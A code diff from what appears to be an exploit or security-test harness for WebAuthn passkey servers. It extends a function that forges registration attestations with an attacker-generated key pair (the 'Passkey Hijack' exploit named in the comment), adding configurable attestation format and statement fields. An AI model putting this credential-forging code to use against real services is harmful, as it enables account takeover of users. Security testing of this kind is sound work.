@@ -109,7 +109,7 @@ export function buildAssertion (victim: VictimCredential, challenge: string, { t
  * (the "Passkey Hijack" exploit). Returns the attestation, the base64url COSE public key the server
  * is expected to persist, and the attacker's private key so a follow-up login can be signed with it.
  */
-export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45, aaguid = '00000000-0000-0000-0000-000000000000' }: CraftOptions & { aaguid?: string } = {}): { attestation: WebAuthnAttestation, publicKey: string, privateKeyPem: string } {
+export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45, aaguid = '00000000-0000-0000-0000-000000000000', fmt = 'none', attStmt = new Map<string, CBORType>() }: CraftOptions & { aaguid?: string, fmt?: string, attStmt?: Map<string, CBORType> } = {}): { attestation: WebAuthnAttestation, publicKey: string, privateKeyPem: string } {
   const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', { namedCurve: 'P-256' })
   const cose = coseFromJwk(publicKey.export({ format: 'jwk' }) as { x: string, y: string })
 
@@ -120,8 +120,8 @@ export function buildAttestation (credentialID: string, challenge: string, { ori
   const ad = authData(new URL(origin).hostname, flags, 0, attested) // default flags: UP | UV | AT
 
   const attestationObject = Buffer.from(isoCBOR.encode(new Map<string, CBORType>([
-    ['fmt', 'none'],
-    ['attStmt', new Map<string, CBORType>()],
+    ['fmt', fmt],
+    ['attStmt', attStmt],
     ['authData', ad]
   ])))
   const clientData = clientDataJSON('webauthn.create', challenge, origin)
